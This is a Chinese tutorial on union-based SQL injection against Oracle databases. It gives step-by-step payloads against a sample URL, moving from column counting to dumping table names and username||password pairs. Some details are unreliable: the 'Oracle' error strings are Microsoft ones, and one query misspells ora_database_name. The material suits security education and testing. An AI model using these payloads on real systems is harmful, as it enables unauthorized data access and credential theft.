## 基于联合查询 union

到目前为止，我们学习了注入MySQL和SQL注入测试的基础知识，并在其他教程中找到注入点。在本教程中，我们将学习如何注入基于Oracle的网站。

在Oracle和其他注入中，找到注入点并制作联合选择语句是相同的，所以我们将继续其余部分，如果你在这之前没有阅读所有的[基本教程](http://securityidiots.com/Web-Pentest/SQL-Injection/)和其他…那么我建议你阅读它们来理解这篇文章。

可以帮助您区分ORACLE db和其他的一些常见错误是
  
```sql
Microsoft OLE DB Provider for ODBC Drivers error '80004005' 
Microsoft VBScript runtime error '800a01a8'
```
 
因此，让我们开始并使用“order by”子句找出列数。

```sql
www.vuln-web.com/photo.php?id=1' order by 1--
Working

www.vuln-web.com/photo.php?id=1-' order by 10--

www.vuln-web.com/photo.php?id=1' order by 7--
Working
www.vuln-web.com/photo.php?id=1' order by 9--
Working
```

所以现在我们知道9是最后一个有效的列，让我们准备联合选择语句
  
```sql
www.vuln-web.com/photo.php?id=1' union select 1,2,3,4,5,6,7,8,9--
Error : FROM keyword not found where expected

www.vuln-web.com/photo.php?id=1' union select 1,2,3,4,5,6,7,8,9 from dual--
Error : expression must have same datatype as corresponding expression

www.vuln-web.com/photo.php?id=1' union select null,null,null,null,null,null,null,null,null from dual--
Working fine
```

与MySQL不同，'Oracle不允许没有from子句的select语句.'由于我们已经准备好了Union select语句，我们的下一个任务是检查哪些列正在打印，我们可以通过打印当前库名逐一随机测试每列来完成

```sql
www.vuln-web.com/photo.php?id=1' union select '1111',null,null,null,null,null,null,null,null from dual--
Error

www.vuln-web.com/photo.php?id=1' union select null,'2222',null,null,null,null,null,null,null from dual--
2222 gets Printed
```
这意味着我们可以从现在开始使用第二列。现在要获取数据库名称，我们可以使用：
(select ora_database_name from dual)  
(select sys.database_name from dual)  
(select global_name from global_name)  
```sql
www.vuln-web.com/photo.php?id=1' union select null,ora.database_name,null,null,null,null,null,null,null from dual--
```
获取用户名： 
(select user from DUAL)  
(select user from users)  
  ```sql
www.vuln-web.com/photo.php?id=1' union select null,user,null,null,null,null,null,null,null from dual--
```

获取版本： 
(select banner from v$version where rownum=1)  
  
```sql
www.vuln-web.com/photo.php?id=1' union select null,(select banner from v$version where rownum=1),null,null,null,null,null,null,null from dual--
```

获取表名: (select table_name from all_tables)  
  
```sql
www.vuln-web.com/photo.php?id=1' union select null,table_name,null,null,null,null,null,null,null from all_tables--
```

获取特定表的列 (用 user_table):  (select column_name from all_tab_columns where table_name='Your_Table_name_here')  
  
```sql
www.vuln-web.com/photo.php?id=1' union select null,column_name,null,null,null,null,null,null,null from all_tab_columns where table_name='user_table'--
```

要从某些列中提取数据，我们可以使用以下查询以及||作为连接运算符：  (select username||password from table_name_here)  
  
```sql
www.vuln-web.com/photo.php?id=1' union select null,username||password,null,null,null,null,null,null,null from user_table--
```